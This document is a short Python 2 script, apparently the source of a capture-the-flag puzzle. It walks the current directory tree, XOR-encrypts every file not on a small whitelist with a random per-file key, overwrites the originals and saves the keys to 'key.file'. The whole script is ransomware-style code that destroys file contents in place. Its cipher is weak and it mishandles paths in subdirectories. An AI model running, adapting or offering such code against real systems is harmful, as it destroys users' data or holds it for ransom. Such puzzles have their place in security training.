import os
import random
from pwn import *
whitelist=["GannaPsy.py","decrypt.py","key.file"]
def encrypt(data,key):
	cipher=""
	for i in range(len(data)):
		cipher+=chr(ord(data[i])^ord(key[i%len(key)]))
	return cipher

f=open("key.file","w")
for dirPath, dirNames, fileNames in os.walk("."):
	fileNames.sort()
	for files in fileNames:
		if files in whitelist:
			continue
		key=random.getrandbits(64)
		key="{:0>16}".format(hex(key)[2:].replace("L","")).decode("hex")
		origin=open(files).read()
		print key.encode("hex")
		f.write(key)
		cipher=encrypt(origin,key)
		print files
		newf=open(files,"w")
		newf.write(cipher)
		newf.close()
f.close()
